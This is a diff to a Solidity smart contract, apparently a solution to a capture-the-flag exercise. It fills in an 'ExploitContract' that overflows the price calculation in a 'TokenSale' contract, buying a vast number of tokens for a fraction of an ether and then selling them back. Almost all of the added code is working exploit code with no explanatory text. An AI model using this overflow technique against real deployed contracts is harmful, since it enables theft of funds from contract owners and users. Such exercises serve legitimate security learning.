@@ -37,10 +37,29 @@ contract TokenSale {
 contract ExploitContract {
     TokenSale public tokenSale;
 
+    // total += numTokens * PRICE_PER_TOKEN;
+    // overflow it  
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
     }
 
+    function buy() public payable {
+        uint256 val;
+        uint256 UINT256_MAX = type(uint).max;
+        unchecked {
+            // val = 415992086870360064 ~= 0.416 ether
+            val = (UINT256_MAX / 1 ether + 1) * 1 ether;
+            emit Log(val);
+        }
+        tokenSale.buy{value: val}(UINT256_MAX / 1 ether + 1);
+    }
+
+    function sell(uint num) public {
+        tokenSale.sell(num);
+    }
+
     receive() external payable {}
     // write your exploit functions below
+
+    event Log(uint256);
 }
